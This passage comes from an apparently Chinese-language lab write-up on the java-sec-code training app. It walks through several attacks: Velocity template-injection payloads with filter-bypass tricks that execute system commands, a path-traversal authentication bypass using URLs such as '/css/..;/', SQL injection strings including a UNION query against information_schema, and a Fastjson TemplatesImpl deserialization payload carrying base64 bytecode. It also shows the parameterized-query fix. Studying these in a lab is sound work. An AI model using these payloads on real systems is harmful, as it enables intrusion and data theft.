class="comment">//这里面.invoke是用于调用静态方法创建getRuntime对象</span></span><br></pre></td></tr></table></figure>

<ol>
<li><strong><code>#set($x=&#39;&#39;)</code></strong><ul>
<li>定义一个变量 <code>$x</code> 并赋值为空字符串（实际类型为 <code>String</code> 对象）。</li>
</ul>
</li>
<li><strong><code>$x.class</code></strong><ul>
<li>通过 <code>String</code> 对象的 <code>class</code> 属性获取 <code>Class</code> 对象，进入反射链。</li>
</ul>
</li>
<li><strong><code>forName(&#39;java.lang.Runtime&#39;)</code></strong><ul>
<li>反射加载 <code>Runtime</code> 类。</li>
</ul>
</li>
<li><strong><code>getRuntime().exec(&#39;calc&#39;)</code></strong><ul>
<li>调用 <code>Runtime.getRuntime().exec()</code> 执行系统命令（如启动计算器）。</li>
</ul>
</li>
</ol>
<p>至于绕过方法我知道的只有编码绕过和拼接绕过关键词过滤</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#set($str=<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Run&quot;</span>+<span class="string">&quot;time&quot;</span>)</span><br><span class="line">#set($x=$str.class.forName($str).getRuntime().exec(<span class="string">&quot;calc&quot;</span>))</span><br><span class="line">    </span><br><span class="line">#set($a=<span class="string">&quot;ja&quot;</span>)#set($b=<span class="string">&quot;va.lang.Run&quot;</span>)#set($c=<span class="string">&quot;time&quot;</span>)</span><br><span class="line">$a$b$c.getClass().forName($a$b$c).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line">#set($cmd=<span class="string">&#x27;Y2FsYw==&#x27;</span>|base64.decode())</span><br><span class="line">$x.class.forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().exec($cmd)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#set($p=<span class="string">&#x27;java.lang.ProcessBuilder&#x27;</span>)</span><br><span class="line">$x.class.forName($p).getConstructor(List.class).newInstance([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;whoami&quot;</span>]).start()</span><br><span class="line"><span class="comment">//使用ProcessBuilder类进行命令执行</span></span><br></pre></td></tr></table></figure>

<p>应该是tomcat认定为特殊字符，所以payload还是编码比较好</p>




<h2 id="12-GetRequestURI"><a href="#12-GetRequestURI" class="headerlink" title="12.GetRequestURI"></a>12.GetRequestURI</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@GetMapping(value = &quot;/exclued/vuln&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">exclued</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line"></span><br><span class="line">        String[] excluedPath = &#123;<span class="string">&quot;/css/**&quot;</span>, <span class="string">&quot;/js/**&quot;</span>&#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> request.getRequestURI(); <span class="comment">// Security: request.getServletPath()</span></span><br><span class="line"><span class="comment">//这里获取了当前请求的uri加入日志当中</span></span><br><span class="line">        <span class="type">PathMatcher</span> <span class="variable">matcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntPathMatcher</span>();</span><br><span class="line"><span class="comment">// 打印日志：当前请求的URI和ServletPath（用于调试）</span></span><br><span class="line">        logger.info(<span class="string">&quot;getRequestURI: &quot;</span> + uri);</span><br><span class="line">        logger.info(<span class="string">&quot;getServletPath: &quot;</span> + request.getServletPath());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String path : excluedPath) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matcher.match(path, uri)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;You have bypassed the login page.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;This is a login page &gt;..&lt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果我们的uri中有/css/和/js/就会绕过认证</span></span><br></pre></td></tr></table></figure>

<p><code>getRequestURI()</code>：返回完整的请求路径（包含上下文路径，如 <code>/app/css/style.css</code>）。</p>
<p>在 Java Web 应用中，<strong>Servlet 映射路径（Servlet Path）</strong> 是指客户端请求的 URL 中 <strong>直接映射到某个 Servlet 的部分</strong>，它不包含上下文路径（Context Path）和路径参数（Path Info）。</p>
<p>但是这个匹配不是固定的而是和我们的系统配置有关，不会返回额外信息，单纯返回映射路径</p>
<p><strong><code>request.getServletPath()</code></strong></p>
<p>返回 <strong>Servlet 本身的映射路径</strong>（如 <code>/servlet</code>），不包含额外的路径信息。</p>
<ul>
<li>示例：若映射为 <code>/hello</code>，访问 <code>/hello/world</code> → 返回 <code>/hello</code>。</li>
</ul>
<p>还有就是我们需要注意一下通配符</p>
<p>这里的 <code>**</code> 是 <strong>Ant 风格通配符</strong>，表示：</p>
<ul>
<li><code>*</code> 匹配单层路径（如 <code>/css/*</code> 只匹配 <code>/css/style.css</code>，不匹配 <code>/css/subdir/file.css</code>）。</li>
<li><code>**</code> 匹配多层路径（如 <code>/css/**</code> 匹配 <code>/css/</code> 下的所有子目录和文件）。</li>
</ul>
<p>当应用存在静态资源目录，比如<code>/css/</code>目录，在权限校验时一般会选择放行，即不校验权限。研发同学用<code>getRequestURI()</code>获取URI后，判断是否包含 <code>/css/</code>字符串，如果包含则不校验权限。此时如果URI为<code>/css/../hello</code>，用<code>getRequestURI()</code>获取的URI是<code>/css/../hello</code>，包含<code>/css/</code>字符串，所以不校验权限。但是此时后端的路由为<code>/hello</code>，导致权限绕过。</p>
<p>我们如果带有<code>/css</code>这个路径就会由于路径错误，如果直接访问就会进行校验</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8080/uri/css/..;/exclued/vuln</span></span><br></pre></td></tr></table></figure>

<p>这个题目给的答案实际是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The difference between getRequestURI and getServletPath.</span></span><br><span class="line"><span class="comment"> * 由于Spring Security的&lt;code&gt;antMatchers(&quot;/css/**&quot;, &quot;/js/**&quot;)&lt;/code&gt;未使用getRequestURI，所以登录不会被绕过。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Details: https://joychou.org/web/security-of-getRequestURI.html</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Poc:</span></span><br><span class="line"><span class="comment"> * http://localhost:8080/css/%2e%2e/exclued/vuln</span></span><br><span class="line"><span class="comment"> * http://localhost:8080/css/..;/exclued/vuln</span></span><br><span class="line"><span class="comment"> * http://localhost:8080/css/..;bypasswaf/exclued/vuln</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> JoyChou @2020-03-28</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>所以说如果我们这个题目不去改后台配置代码我们是不能进行绕过的，在获取uri的时候会对uri先进一次处理</p>
<p>Spring Security 默认使用 getServletPath() 进行路径匹配（而非 getRequestURI）。也就是说uri都会优先使用getServletPath进行匹配一次然后再执行代码</p>
<p>虽然绕过不了了，但是我们可以分析一下payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8080/uri/css/..;/exclued/vuln</span></span><br></pre></td></tr></table></figure>

<p>分号的作用应该就是用来防止tomcat将<code>..</code>作为标准uri解析，如果去掉分号则会变成</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2025</span>-08-<span class="number">07</span> <span class="number">19</span>:<span class="number">33</span>:<span class="number">19.863</span>  INFO <span class="number">31280</span> --- [nio-<span class="number">8080</span>-exec-<span class="number">3</span>] org.joychou.controller.GetRequestURI     : getRequestURI: /uri/exclued/vuln</span><br><span class="line"><span class="number">2025</span>-08-<span class="number">07</span> <span class="number">19</span>:<span class="number">33</span>:<span class="number">19.863</span>  INFO <span class="number">31280</span> --- [nio-<span class="number">8080</span>-exec-<span class="number">3</span>] org.joychou.controller.GetRequestURI     : getServletPath: /uri/exclued/vuln</span><br></pre></td></tr></table></figure>

<p>我们发现tomcat是解析了<code>/css/../</code>进行一次目录的穿梭，去掉了没有意义的<code>/css/</code></p>
<p>这个本来不规范的uri为什么不会报错，我们先来尝试把分号去掉</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8080/uri/css/..;/exclued/vuln</span></span><br><span class="line"><span class="comment">//在经过回车后变成了</span></span><br><span class="line">http:<span class="comment">//127.0.0.1:8080/uri/exclued/vuln</span></span><br></pre></td></tr></table></figure>

<p>这明显是<code>..</code>作为目录跨越符起作用了，但是为什么有分号就不行。有分号后就从标准写法到了不标准写法，看起来很有道理，但是为什么又会正确解析这个就和tomcat的版本以及一些细节有关系，不是我能够知道的</p>
<p>我还需要知道的是在</p>
<p><strong>旧版本（Servlet 3.0 之前）</strong><br>分号 <code>;</code> 被用作路径参数分隔符（如 <code>/path;jsessionid=123</code>），<strong>分号后的内容会被截断</strong>。<br>例如：<code>/uri/css/..;/exclued/vuln</code> → 实际路径为 <code>/uri/css/..</code>。</p>
<p><strong>新版本（Servlet 3.0+，默认行为）</strong><br>分号不再具有特殊含义，<strong>除非显式配置</strong>。大多数现代容器（如 Tomcat 8+）会保留分号作为普通字符。<br>因此 <code>..;/exclued/vuln</code> 会被当作完整字符串处理，<strong>不会自动截断</strong>。</p>
<p>但是我自己尝试发现在uri最后的分号还是会有隔断作用</p>
<h2 id="13-SQLI"><a href="#13-SQLI" class="headerlink" title="13.SQLI"></a>13.SQLI</h2><p>终于到了SQL注入了吗，PHP学的第一个漏洞也就是这个了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个处理HTTP请求的控制器方法，映射到路径&quot;/jdbc/vuln&quot;</span></span><br><span class="line"><span class="comment">// 使用@RequestParam获取请求参数&quot;username&quot;</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/jdbc/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">jdbc_sqli_vul</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于存储查询结果的StringBuilder</span></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 加载数据库驱动</span></span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 建立数据库连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查连接是否成功</span></span><br><span class="line">        <span class="keyword">if</span> (!con.isClosed())</span><br><span class="line">            System.out.println(<span class="string">&quot;Connect to database successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 创建Statement对象</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> con.createStatement();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. 构造SQL查询语句 - 这里直接拼接用户输入，导致SQL注入漏洞</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        logger.info(sql);  <span class="comment">// 记录SQL语句（调试用）</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 5. 执行SQL查询</span></span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 处理查询结果</span></span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_pwd</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s: %s\n&quot;</span>, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);  <span class="comment">// 记录查询到的用户信息</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 7. 关闭资源</span></span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;Sorry, can&#x27;t find the Driver!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回查询结果</span></span><br><span class="line">    <span class="keyword">return</span> result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们想要注入和之前一样简单直接万能密码就行了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=1 %23</span></span><br></pre></td></tr></table></figure>

<p>我们也可以使用联合注入等其他注入方法爆出其他数据库的信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="string">&#x27;union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema%3Ddatabase() %23</span></span><br></pre></td></tr></table></figure>



<p>和PHP是一样的</p>
<p>然后我们来看这一段修复代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个处理HTTP请求的控制器方法，映射到路径&quot;/jdbc/sec&quot;</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/jdbc/sec&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">jdbc_sqli_sec</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于存储查询结果的StringBuilder</span></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 加载数据库驱动</span></span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 建立数据库连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查连接是否成功</span></span><br><span class="line">        <span class="keyword">if</span> (!con.isClosed())</span><br><span class="line">            System.out.println(<span class="string">&quot;Connect to database successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 使用PreparedStatement防止SQL注入</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = ?&quot;</span>;  <span class="comment">// 使用参数占位符?</span></span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">        st.setString(<span class="number">1</span>, username);  <span class="comment">// 安全地设置参数值 根据占位符的序号安全写入参数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录预处理后的SQL语句（调试用）</span></span><br><span class="line">        logger.info(st.toString());  <span class="comment">// 注意：这里输出的不一定是最终执行的SQL</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. 执行查询</span></span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 处理查询结果</span></span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_pwd</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s: %s\n&quot;</span>, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);  <span class="comment">// 记录查询到的用户信息</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 关闭资源</span></span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;Sorry, can&#x27;t find the Driver!&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回查询结果</span></span><br><span class="line">    <span class="keyword">return</span> result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个就是典型的占位符直接封锁一次注入，但是要是有二次注入也是要炸掉的</p>
<h2 id="14-Fastjson"><a href="#14-Fastjson" class="headerlink" title="14.Fastjson"></a>14.Fastjson</h2><p>我们知道java中除了传统的序列化数据还可以使用json数据进行序列化，也就是json反序列化</p>
<p>FastJson是开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/fastjson&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/deserialize&quot;, method = &#123;RequestMethod.POST&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Deserialize</span><span class="params">(<span class="meta">@RequestBody</span> String params)</span> &#123;</span><br><span class="line">        <span class="comment">// 如果Content-Type不设置application/json格式，post数据会被url编码</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 将post提交的string转换为json</span></span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">ob</span> <span class="operator">=</span> JSON.parseObject(params);</span><br><span class="line"><span class="comment">//对params参数进行json反序列化</span></span><br><span class="line">            <span class="keyword">return</span> ob.get(<span class="string">&quot;name&quot;</span>).toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// Open calc in mac</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;: [\&quot;yv66vgAAADEAOAoAAwAiBwA2BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAzTG1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACgALBwAoAQAxbWUvbGlnaHRsZXNzL2Zhc3Rqc29uL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAHW1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA9saWdodGxlc3MvcHduZXIBABFMbGlnaHRsZXNzL3B3bmVyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwA3AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAD8ADgAAACAAAwAAAAEADwA3AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAEIADgAAACoABAAAAAEADwA3AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAABsAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAAAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ==\&quot;], \&quot;_name\&quot;: \&quot;lightless\&quot;, \&quot;_tfactory\&quot;: &#123; &#125;, \&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们之前学过Java反序列化，那个是通过readObject方法进行反序列化，也就是像php中userialize一样，通过改变类的属性来实现攻击。</p>
<p>但是在我看来json反序列化好像不能像readObject直接对对象做出改变，我感觉更像是<code>json_decode</code>，会将json数据解码为字符串，数组等数据结构。</p>
<p>但是至于为什么Fastjson会有json反序列化漏洞还得看<code>Feature.SupportNonPublicField</code></p>
<p><strong><code>Feature.SupportNonPublicField</code> 的作用</strong></p>
<ul>
<li><strong>Feature</strong> 是Fastjson的一个枚举类，用于控制反序列化的行为。</li>
<li><strong><code>SupportNonPublicField</code></strong> 的具体含义：<ul>
<li><strong>允许反序列化非公有字段</strong>（即private、protected等字段）。</li>
<li>正常情况下，Fastjson仅能反序列化公有字段（public）或通过setter方法赋值的字段。</li>
<li><strong>漏洞利用关键</strong>：<code>TemplatesImpl</code>类的恶意字段（如<code>_bytecodes</code>、<code>_outputProperties</code>）都是<strong>private</strong>的，需要此Feature才能注入。</li>
</ul>
</li>
</ul>
